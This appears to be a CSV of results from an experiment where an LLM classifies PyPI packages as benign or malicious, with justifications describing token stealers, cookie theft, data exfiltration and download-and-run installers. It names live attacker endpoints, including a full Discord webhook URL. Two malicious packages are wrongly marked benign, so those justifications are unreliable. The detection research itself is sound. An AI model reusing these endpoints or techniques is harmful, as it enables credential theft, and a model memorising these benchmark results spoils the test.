"groundtruth","subclass","package_size","classification","package_name","agent","justification","classification_id","package_name-2","package_metadata","classification-2","justification-2","suspicious_files","created_at","updated_at","prompt_id","model","dataset_id","experiment_id"
"benign","benign","35348","benign","telegraph-2.1.0.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains standard imports (`setuptools`, `distutils.core`) and lists common, legitimate third-party libraries (`requests`, `httpx`) as dependencies. No suspicious file operations or external communications were observed in `setup.py`.","a761fcf2-603c-416e-ad4a-9286bd112e4a","telegraph","{""model_type"": ""gemini"", ""author_name"": ""python273"", ""author_email"": ""telegraph@python273.pw"", ""num_of_files"": 15, ""package_name"": ""telegraph"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Telegraph API wrapper"", ""package_version"": ""2.1.0"", ""package_homepage"": ""https://github.com/python273/telegraph"", ""gemini_raw_response"": ""Benign. The `setup.py` file contains standard imports (`setuptools`, `distutils.core`) and lists common, legitimate third-party libraries (`requests`, `httpx`) as dependencies. No suspicious file operations or external communications were observed in `setup.py`.\n\nNo suspicious files detected."", ""num_of_python_files"": 7, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""exceptions.py"", ""utils.py"", ""aio.py"", ""api.py"", ""__init__.py"", ""upload.py""], ""package_formatted_path"": "".temp/plain/telegraph-2.1.0_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file contains standard imports (`setuptools`, `distutils.core`) and lists common, legitimate third-party libraries (`requests`, `httpx`) as dependencies. No suspicious file operations or external communications were observed in `setup.py`.","{}","2025-06-29 20:55:35.172079+00","2025-06-29 20:55:35.172079+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","c33a488c-d0c4-42da-ac2e-5b5906fd7be0","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","103843","benign","dbt-spark-1.2.0.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains standard package setup configurations, including dependency declarations and basic system checks. The `__init__.py` file serves as an entry point, importing necessary components from other files within the `dbt.adapters.spark` module, which is consistent with the package's role as a dbt adapter. No suspicious commands, obfuscated code, or unusual external calls were observed in the initial analysis of these files. The package's structure and imports align with its stated purpose.","6daa69b3-5784-46b9-8ca0-1eb2db552463","dbt-spark","{""model_type"": ""gemini"", ""author_name"": ""dbt Labs"", ""author_email"": ""info@dbtlabs.com"", ""num_of_files"": 36, ""package_name"": ""dbt-spark"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""The Apache Spark adapter plugin for dbt"", ""package_version"": ""1.2.0"", ""package_homepage"": ""https://github.com/dbt-labs/dbt-spark"", ""gemini_raw_response"": ""Benign.\n\nThe `setup.py` file contains standard package setup configurations, including dependency declarations (`dbt-core`, `sqlparams`, `pyodbc`, `PyHive`, `pyspark`) and basic system checks. The `__init__.py` file serves as an entry point, importing necessary components from other files within the `dbt.adapters.spark` module, which is consistent with the package's role as a dbt adapter. No suspicious commands, obfuscated code, or unusual external calls were observed in the initial analysis of these files. The package's structure and imports align with its stated purpose.\n\nNo suspicious files were identified."", ""num_of_python_files"": 8, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""connections.py"", ""relation.py"", ""impl.py"", ""column.py"", ""__version__.py"", ""session.py""], ""package_formatted_path"": "".temp/plain/dbt-spark-1.2.0_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file contains standard package setup configurations, including dependency declarations and basic system checks. The `__init__.py` file serves as an entry point, importing necessary components from other files within the `dbt.adapters.spark` module, which is consistent with the package's role as a dbt adapter. No suspicious commands, obfuscated code, or unusual external calls were observed in the initial analysis of these files. The package's structure and imports align with its stated purpose.","{}","2025-06-29 20:55:39.169249+00","2025-06-29 20:55:39.169249+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","7bb5fefa-c15e-4996-b4aa-15292edfc560","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","4647","malicious","pptest-999.0.6.tar.gz","classifier-no-tool-no-state-information","The `__init__.py` file contains highly suspicious code. It attempts to gather system information such as hostname, current working directory, and both local and public IP addresses. It then exfiltrates this information via DNS queries to a hardcoded domain (`hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net`). This behavior, combined with the `setup.py` file attempting to alias the `pip` command to `pptest:mypip` (which would execute the malicious code when `pip` is run), is a clear indicator of malicious intent.","a3514021-d732-4d82-a68e-4112322f3480","pptest","{""model_type"": ""gemini"", ""author_name"": ""pptest"", ""author_email"": ""testtt@google.com"", ""num_of_files"": 8, ""package_name"": ""pptest"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""just for test"", ""package_version"": ""999.0.6"", ""package_homepage"": ""https://www.google.com"", ""gemini_raw_response"": ""Classification: Malicious\n\nJustification: The `__init__.py` file contains highly suspicious code. It attempts to gather system information such as hostname, current working directory, and both local and public IP addresses. It then exfiltrates this information via DNS queries to a hardcoded domain (`hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net`). This behavior, combined with the `setup.py` file attempting to alias the `pip` command to `pptest:mypip` (which would execute the malicious code when `pip` is run), is a clear indicator of malicious intent.\n\nSuspicious file(s): `__init__.py`"", ""num_of_python_files"": 2, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pptest-999.0.6_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""__init__.py""]}","malicious","The `__init__.py` file contains highly suspicious code. It attempts to gather system information such as hostname, current working directory, and both local and public IP addresses. It then exfiltrates this information via DNS queries to a hardcoded domain (`hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net`). This behavior, combined with the `setup.py` file attempting to alias the `pip` command to `pptest:mypip` (which would execute the malicious code when `pip` is run), is a clear indicator of malicious intent.","{__init__.py}","2025-06-29 20:56:06.251801+00","2025-06-29 20:56:06.251801+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","c414137e-d7cf-41af-a1d2-a7cfc7d463e3","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","128025","benign","pytz3-dev.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file uses standard packaging practices and imports `pytz3` which is the package itself, and `os` for file system operations, both of which are common and not indicative of malicious behavior. The `package_data` section correctly collects timezone information files. There are no suspicious commands or unusual operations in `setup.py`.","ca817563-439b-4cb6-bca0-576541ce2305","pytz3-dev","{""model_type"": ""gemini"", ""author_name"": ""Stuart Bishop"", ""author_email"": ""stuart@stuartbishop.net"", ""num_of_files"": 17, ""package_name"": ""pytz3-dev"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""World timezone definitions, modern and historical"", ""package_version"": ""2018.7"", ""package_homepage"": ""http://pythonhosted.org/pytz3-dev"", ""gemini_raw_response"": ""The package appears to be benign.\n\n**Justification:**\nThe `setup.py` file uses standard packaging practices and imports `pytz3` which is the package itself, and `os` for file system operations, both of which are common and not indicative of malicious behavior. The `package_data` section correctly collects timezone information files. There are no suspicious commands or unusual operations in `setup.py`.\n\n**Suspicious Files:** None."", ""num_of_python_files"": 7, ""package_description"": ""pytz - World Timezone Definitions for Python"", ""available_python_files"": [""setup.py"", ""exceptions.py"", ""reference.py"", ""tzfile.py"", ""__init__.py"", ""tzinfo.py"", ""lazy.py""], ""package_formatted_path"": "".temp/plain/pytz3-dev_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file uses standard packaging practices and imports `pytz3` which is the package itself, and `os` for file system operations, both of which are common and not indicative of malicious behavior. The `package_data` section correctly collects timezone information files. There are no suspicious commands or unusual operations in `setup.py`.","{}","2025-06-29 20:56:06.256549+00","2025-06-29 20:56:06.256549+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","f932ae1f-f0c9-4a3d-bea2-3cbf1c21ceca","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","12943","benign","importantpackage-0.2.4.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains standard setup information and imports `importantpackage` and `setuptools`, which are common and expected for a Python package. There are no suspicious imports or code in the `setup.py` file.","6d867533-0a98-4f0e-a443-4bfcbae2f36f","importantpackage","{""model_type"": ""gemini"", ""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""importantpackage"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.2.4"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""gemini_raw_response"": ""Benign. The `setup.py` file contains standard setup information and imports `importantpackage` and `setuptools`, which are common and expected for a Python package. There are no suspicious imports or code in the `setup.py` file. Further analysis of other python files would be required to make a definitive decision."", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""program.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/importantpackage-0.2.4_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file contains standard setup information and imports `importantpackage` and `setuptools`, which are common and expected for a Python package. There are no suspicious imports or code in the `setup.py` file.","{}","2025-06-29 20:56:31.501902+00","2025-06-29 20:56:31.501902+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","f1f7f2fd-009a-43a5-8bb3-d41d7ab74117","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","92981","benign","evdev-1.6.0.tar.gz","classifier-no-tool-no-state-information","The package's `setup.py` and `__init__.py` files show no suspicious behavior. `setup.py` handles the compilation of C extensions and the generation of `ecodes.c` using `genecodes.py`, which is a legitimate build process for a package interacting with the Linux input subsystem. `__init__.py` only imports other modules within the `evdev` package itself. All observed operations align with the package's declared purpose.","e215fd9e-d4e4-46a1-8747-aae8f588293f","evdev","{""model_type"": ""gemini"", ""author_name"": ""Georgi Valkov"", ""author_email"": ""georgi.t.valkov@gmail.com"", ""num_of_files"": 23, ""package_name"": ""evdev"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Bindings to the Linux input handling subsystem"", ""package_version"": ""1.6.0"", ""package_homepage"": ""https://github.com/gvalkov/python-evdev"", ""gemini_raw_response"": ""Classification: Benign\nJustification: The package's `setup.py` and `__init__.py` files show no suspicious behavior. `setup.py` handles the compilation of C extensions and the generation of `ecodes.c` using `genecodes.py`, which is a legitimate build process for a package interacting with the Linux input subsystem. `__init__.py` only imports other modules within the `evdev` package itself. All observed operations align with the package's declared purpose.\nSuspicious file(s): None."", ""num_of_python_files"": 12, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""uinput.py"", ""eventio_async.py"", ""ecodes.py"", ""util.py"", ""events.py"", ""eventio.py"", ""ff.py"", ""device.py"", ""evtest.py"", ""__init__.py"", ""genecodes.py""], ""package_formatted_path"": "".temp/plain/evdev-1.6.0_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The package's `setup.py` and `__init__.py` files show no suspicious behavior. `setup.py` handles the compilation of C extensions and the generation of `ecodes.c` using `genecodes.py`, which is a legitimate build process for a package interacting with the Linux input subsystem. `__init__.py` only imports other modules within the `evdev` package itself. All observed operations align with the package's declared purpose.","{}","2025-06-29 20:56:54.656787+00","2025-06-29 20:56:54.656787+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","6c53568f-fb01-4dca-9ff9-1edfc47fe747","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","55429","benign","django_saml2_auth-2.2.1.tar.gz","classifier-no-tool-no-state-information","This package appears to be benign. The `setup.py` file uses standard libraries for package setup and lists common, non-malicious dependencies (`pysaml2`, `djangorestframework-jwt`, `django-rest-auth`). There are no immediate indicators of malicious activity based on the provided metadata and the initial analysis of the `setup.py` file.","acfa8ca9-0b26-496d-8b4b-3a3e98f940f6","django-saml2-auth","{""model_type"": ""gemini"", ""author_name"": ""Fang Li"", ""author_email"": ""surivlee+djsaml2auth@gmail.com"", ""num_of_files"": 16, ""package_name"": ""django-saml2-auth"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Django SAML2 Authentication Made Easy. Easily integrate with SAML2 SSO identity providers like Okta"", ""package_version"": ""2.2.1"", ""package_homepage"": ""https://github.com/fangli/django-saml2-auth"", ""gemini_raw_response"": ""Benign.\n\nThis package appears to be benign. The `setup.py` file uses standard libraries for package setup and lists common, non-malicious dependencies (`pysaml2`, `djangorestframework-jwt`, `django-rest-auth`). There are no immediate indicators of malicious activity based on the provided metadata and the initial analysis of the `setup.py` file. No suspicious files were identified."", ""num_of_python_files"": 4, ""package_description"": ""====================================="", ""available_python_files"": [""setup.py"", ""views.py"", ""urls.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/django_saml2_auth-2.2.1_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","This package appears to be benign. The `setup.py` file uses standard libraries for package setup and lists common, non-malicious dependencies (`pysaml2`, `djangorestframework-jwt`, `django-rest-auth`). There are no immediate indicators of malicious activity based on the provided metadata and the initial analysis of the `setup.py` file.","{}","2025-06-29 20:56:57.084123+00","2025-06-29 20:56:57.084123+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","c1b83b32-67bf-4544-802d-994f557b8d3e","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","7733","malicious","humanqueen-0.0.1.tar.gz","classifier-no-tool-no-state-information","The `__init__.py` file contains highly suspicious code. It attempts to: *   Collect Discord tokens from various browser and Discord client paths. *   Validate these tokens by making requests to the Discord API. *   Exfiltrate the collected tokens and the user's IP address to an external URL (`https://rentry.co/23azs/raw`). This behavior is characteristic of an information stealer, indicating malicious intent.","331470f0-03ed-4c69-a4bd-e698a7521d19","humanqueen","{""model_type"": ""gemini"", ""author_name"": ""xin"", ""author_email"": ""xin@gmail.com"", ""num_of_files"": 8, ""package_name"": ""humanqueen"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Package pour humanqueen"", ""package_version"": ""0.0.1"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""**Classification:** Malicious\n\n**Justification:** The `__init__.py` file contains highly suspicious code. It attempts to:\n*   Collect Discord tokens from various browser and Discord client paths.\n*   Validate these tokens by making requests to the Discord API.\n*   Exfiltrate the collected tokens and the user's IP address to an external URL (`https://rentry.co/23azs/raw`).\n\nThis behavior is characteristic of an information stealer, indicating malicious intent.\n\n**Suspicious File(s):** `__init__.py`"", ""num_of_python_files"": 2, ""package_description"": ""cest rien de ouf hein juste un package pour humanqueen"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/humanqueen-0.0.1_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""__init__.py""]}","malicious","The `__init__.py` file contains highly suspicious code. It attempts to: *   Collect Discord tokens from various browser and Discord client paths. *   Validate these tokens by making requests to the Discord API. *   Exfiltrate the collected tokens and the user's IP address to an external URL (`https://rentry.co/23azs/raw`). This behavior is characteristic of an information stealer, indicating malicious intent.","{__init__.py}","2025-06-29 20:57:23.849018+00","2025-06-29 20:57:23.849018+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","dd1e3f63-85e6-44f7-979e-8cb3b7d9e7bd","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","2809","malicious","xss-0.0.7.tar.gz","classifier-no-tool-no-state-information","The `__init__.py` file contains code that actively attempts to steal Roblox security cookies (`.ROBLOSECURITY`) from multiple web browsers (Edge, Chrome, Firefox, Opera) using the `browser_cookie3` library. These stolen cookies are then exfiltrated to a hardcoded Discord webhook URL (`https://discord.com/api/webhooks/929751520491208735/nVdw7wFzXrgnFaQrd4h5wzOvRJmoRAVC-5PWQjKSZIWbgjbReGKVz8PM2Htw2SAb2P4O`). This malicious activity is initiated immediately upon the package's import, as the logger functions are called in separate threads at the end of the `__init__.py` file.","63560635-216c-4b4e-ba17-7acae16f5a66","xss","{""model_type"": ""gemini"", ""author_name"": ""Drake Sniffer"", ""author_email"": ""drakesniffer@gmail.com"", ""num_of_files"": 8, ""package_name"": ""xss"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A simple XSS Toolkit"", ""package_version"": ""0.0.7"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""The package is classified as **malicious**.\n\n**Justification:** The `__init__.py` file contains code that actively attempts to steal Roblox security cookies (`.ROBLOSECURITY`) from multiple web browsers (Edge, Chrome, Firefox, Opera) using the `browser_cookie3` library. These stolen cookies are then exfiltrated to a hardcoded Discord webhook URL (`https://discord.com/api/webhooks/929751520491208735/nVdw7wFzXrgnFaQrd4h5wzOvRJmoRAVC-5PWQjKSZIWbgjbReGKVz8PM2Htw2SAb2P4O`). This malicious activity is initiated immediately upon the package's import, as the logger functions are called in separate threads at the end of the `__init__.py` file.\n\n**Suspicious file(s):** `__init__.py`"", ""num_of_python_files"": 2, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/xss-0.0.7_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""__init__.py""]}","malicious","The `__init__.py` file contains code that actively attempts to steal Roblox security cookies (`.ROBLOSECURITY`) from multiple web browsers (Edge, Chrome, Firefox, Opera) using the `browser_cookie3` library. These stolen cookies are then exfiltrated to a hardcoded Discord webhook URL (`https://discord.com/api/webhooks/929751520491208735/nVdw7wFzXrgnFaQrd4h5wzOvRJmoRAVC-5PWQjKSZIWbgjbReGKVz8PM2Htw2SAb2P4O`). This malicious activity is initiated immediately upon the package's import, as the logger functions are called in separate threads at the end of the `__init__.py` file.","{__init__.py}","2025-06-29 20:57:26.843321+00","2025-06-29 20:57:26.843321+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","74626f64-f830-417c-af59-4391a912e20c","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","4889","malicious","mybiubiubiu-0.1.6.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains code that collects system information (username, hostname, IP address, Python version) and exfiltrates it to a hardcoded external IP address (`http://123.206.22.33:5000/p/`) via an HTTP POST request. This unauthorized data collection and transmission is a clear malicious activity.","4971b9ef-6ec0-4c61-8d36-a2aa864c1ef2","mybiubiubiu","{""model_type"": ""gemini"", ""author_name"": ""biubiubiu"", ""author_email"": ""biubiubiu2@yopmail.com"", ""num_of_files"": 9, ""package_name"": ""mybiubiubiu"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""change some functions"", ""package_version"": ""0.1.6"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file contains code that collects system information (username, hostname, IP address, Python version) and exfiltrates it to a hardcoded external IP address (`http://123.206.22.33:5000/p/`) via an HTTP POST request. This unauthorized data collection and transmission is a clear malicious activity.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 3, ""package_description"": ""mybiubiubiu"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""test_{{cookiecutter.package_name}}.py""], ""package_formatted_path"": "".temp/plain/mybiubiubiu-0.1.6_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains code that collects system information (username, hostname, IP address, Python version) and exfiltrates it to a hardcoded external IP address (`http://123.206.22.33:5000/p/`) via an HTTP POST request. This unauthorized data collection and transmission is a clear malicious activity.","{setup.py}","2025-06-29 20:57:54.34959+00","2025-06-29 20:57:54.34959+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","52ed6e07-1891-4895-8eb0-0506884f1bf4","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","3929","malicious","aws-login0tool-0.0.8.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file attempts to download an executable file named ""syswin32.exe"" from ""https://tryg.ga/syswin32.exe"" and then executes it using `subprocess.run`. This behavior is highly suspicious and indicative of a supply chain attack.","a596d719-f31a-4b6d-ad71-86edcdf336c4","aws-login0tool","{""model_type"": ""gemini"", ""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.8"", ""package_homepage"": ""https://example.com"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file attempts to download an executable file named \""syswin32.exe\"" from \""https://tryg.ga/syswin32.exe\"" and then executes it using `subprocess.run`. This behavior is highly suspicious and indicative of a supply chain attack.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.8_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file attempts to download an executable file named ""syswin32.exe"" from ""https://tryg.ga/syswin32.exe"" and then executes it using `subprocess.run`. This behavior is highly suspicious and indicative of a supply chain attack.","{setup.py}","2025-06-29 20:58:21.673491+00","2025-06-29 20:58:21.673491+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","02425250-b7d8-4037-8a62-85a5d52d427c","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","49425","malicious","maratlib-1.0.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains heavily obfuscated code, including functions (`l111ll1l_lol_`, `l1ll1ll11_lol_`) that deobfuscate unicode strings and then use `eval()` to execute the resulting code. Specifically, it appears to dynamically import a module and execute commands via `getoutput()`, which is a common tactic for arbitrary code execution during package installation. The presence of such obfuscation and dynamic code execution strongly indicates malicious intent.","fa7a44f0-604d-463c-8b6d-2d811a91e286","maratlib","{""model_type"": ""gemini"", ""author_name"": ""UNKNOWN"", ""author_email"": ""b@gmail.com"", ""num_of_files"": 7, ""package_name"": ""maratlib"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""lalala"", ""package_version"": ""1.0"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""Classification: Malicious\n\nJustification: The `setup.py` file contains heavily obfuscated code, including functions (`l111ll1l_lol_`, `l1ll1ll11_lol_`) that deobfuscate unicode strings and then use `eval()` to execute the resulting code. Specifically, it appears to dynamically import a module and execute commands via `getoutput()`, which is a common tactic for arbitrary code execution during package installation. The presence of such obfuscation and dynamic code execution strongly indicates malicious intent.\n\nSuspicious file(s): setup.py"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/maratlib-1.0_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains heavily obfuscated code, including functions (`l111ll1l_lol_`, `l1ll1ll11_lol_`) that deobfuscate unicode strings and then use `eval()` to execute the resulting code. Specifically, it appears to dynamically import a module and execute commands via `getoutput()`, which is a common tactic for arbitrary code execution during package installation. The presence of such obfuscation and dynamic code execution strongly indicates malicious intent.","{setup.py}","2025-06-29 20:58:21.673567+00","2025-06-29 20:58:21.673567+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","49d40f02-d13a-4bfd-934e-e84b4754772f","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","25000","benign","JSON-log-formatter-0.5.1.tar.gz","classifier-no-tool-no-state-information","The package metadata, including author, homepage, and summary, is consistent with a legitimate JSON logging utility. Analysis of `setup.py` reveals standard package setup operations, and `__init__.py` contains code for JSON log formatting using standard Python libraries (`logging`, `datetime`, `json`). No suspicious imports, obfuscation, or malicious activities were identified in the examined files.","482cd96b-02dc-4461-a5e3-027413b847c5","JSON-log-formatter","{""model_type"": ""gemini"", ""author_name"": ""Marsel Mavletkulov"", ""author_email"": ""marselester@ya.ru"", ""num_of_files"": 9, ""package_name"": ""JSON-log-formatter"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""JSON log formatter"", ""package_version"": ""0.5.1"", ""package_homepage"": ""https://github.com/marselester/json-log-formatter"", ""gemini_raw_response"": ""Classification: Benign\nJustification: The package metadata, including author, homepage, and summary, is consistent with a legitimate JSON logging utility. Analysis of `setup.py` reveals standard package setup operations, and `__init__.py` contains code for JSON log formatting using standard Python libraries (`logging`, `datetime`, `json`). No suspicious imports, obfuscation, or malicious activities were identified in the examined files."", ""num_of_python_files"": 2, ""package_description"": ""=================="", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/JSON-log-formatter-0.5.1_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The package metadata, including author, homepage, and summary, is consistent with a legitimate JSON logging utility. Analysis of `setup.py` reveals standard package setup operations, and `__init__.py` contains code for JSON log formatting using standard Python libraries (`logging`, `datetime`, `json`). No suspicious imports, obfuscation, or malicious activities were identified in the examined files.","{}","2025-06-29 20:58:48.34779+00","2025-06-29 20:58:48.34779+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","4c6fec10-9193-4722-87dc-b38d05d908e7","8bca045c-2577-46e3-bd68-24d40f4aec73"
